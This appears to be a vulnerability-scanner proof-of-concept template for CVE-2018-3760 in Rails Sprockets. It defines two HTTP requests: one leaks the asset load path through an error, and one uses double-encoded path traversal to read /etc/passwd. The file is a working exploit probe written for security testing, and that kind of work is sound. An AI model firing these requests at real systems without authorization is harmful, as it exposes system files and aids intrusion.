name: poc-yaml-Rails-CVE-2018-3760-rce
rules:
  - method: GET
    path: '/assets/file:%2f%2f/etc/passwd'
    follow_redirects: false
    expression: |
      status==500 && body.bcontains(b'FileOutsidePaths')
    search: '/etc/passwd is no longer under a load path: (.*?),'
  - method: GET
    path: >-
      /assets/file:%2f%2f{{1}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
    follow_redirects: false
    expression: |
      status==200 && body.bcontains(b'root:x:0:0')
detail:
    author: leezp
    Affected Version: "Sprockets<=3.7.1"
    Environment: https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760